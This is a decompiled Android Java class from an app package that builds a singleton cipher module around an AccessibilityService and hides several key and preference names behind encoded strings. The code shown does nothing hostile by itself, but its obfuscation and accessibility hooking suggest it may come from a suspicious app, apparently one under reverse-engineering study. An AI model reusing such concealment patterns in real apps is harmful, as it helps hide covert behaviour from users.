package p000;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import com.storm.safe.rock.util.StringUtil;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: hy */
/* loaded from: classes2.dex */
public final class C0600hy {
    public /* synthetic */ C0600hy(AbstractC1120qr abstractC1120qr) {
        this();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final String getKEY_ALIAS() {
        return StringUtil.m212470a0("KFABMkgqMy9SIhRSFCM=");
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final String getKEY_LOCK_CIPHER() {
        return StringUtil.m212470a0("J1YSMXI7BT5fNDlmFDROKhU+QzQv");
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final String getPREFS_NAME() {
        return StringUtil.m212470a0("KFABMkgqMz1SMj5LFAVdKgkoRA==");
    }

    public final C0335a1 getInstance() {
        return C0335a1.f53285c7;
    }

    public final String getQUALITY_NUMERIC() {
        return StringUtil.m212470a0("G3giCXoXPgpoAB54PRN5ATMAYhwOazgZ");
    }

    private C0600hy() {
    }

    public final C0335a1 getInstance(AccessibilityService accessibilityService, Context context) {
        C0335a1 c0335a1;
        t60.m214695b6(accessibilityService, "service");
        t60.m214695b6(context, "context");
        synchronized (this) {
            try {
                c0335a1 = C0335a1.f53285c7;
                if (c0335a1 == null) {
                    c0335a1 = new C0335a1(accessibilityService, context);
                    C0335a1.f53285c7 = c0335a1;
                } else {
                    c0335a1.f53286a0 = accessibilityService;
                }
            } catch (Throwable th) {
                throw th;
            }
        }
        return c0335a1;
    }
}
